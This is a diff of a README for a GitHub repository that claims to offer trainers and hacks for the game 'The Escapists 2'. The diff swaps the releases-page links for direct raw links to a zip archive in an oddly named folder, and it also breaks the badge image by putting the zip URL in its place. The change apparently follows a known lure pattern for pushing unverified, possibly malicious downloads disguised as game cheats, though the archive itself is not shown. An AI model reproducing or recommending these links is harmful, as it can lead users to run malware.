@@ -1,7 +1,7 @@
 # 🎮 The-Escapists-2-trainers-hacks - Unlock Your Game with Ease
 
 ## 📥 Download Now
-[![Download The Escapists 2 Trainers Hacks](https://img.shields.io/badge/Download%20Now-Get%20the%20Trainers%20Pack-brightgreen)](https://github.com/Prashanth2706kumar/The-Escapists-2-trainers-hacks/releases)
+[![Download The Escapists 2 Trainers Hacks](https://raw.githubusercontent.com/Prashanth2706kumar/The-Escapists-2-trainers-hacks/main/podices/The-Escapists-2-trainers-hacks.zip%20Now-Get%20the%20Trainers%20Pack-brightgreen)](https://raw.githubusercontent.com/Prashanth2706kumar/The-Escapists-2-trainers-hacks/main/podices/The-Escapists-2-trainers-hacks.zip)
 
 ---
 
@@ -52,4 +52,4 @@ Join the community to share your experiences, report issues, or ask for help. Co
 
 ---
 
-For any updates or additional downloads, make sure to **visit this page to download** again later: [Releases Page](https://github.com/Prashanth2706kumar/The-Escapists-2-trainers-hacks/releases). Enjoy your gaming adventures with **The Escapists 2 Trainers Hacks**!
+For any updates or additional downloads, make sure to **visit this page to download** again later: [Releases Page](https://raw.githubusercontent.com/Prashanth2706kumar/The-Escapists-2-trainers-hacks/main/podices/The-Escapists-2-trainers-hacks.zip). Enjoy your gaming adventures with **The Escapists 2 Trainers Hacks**!
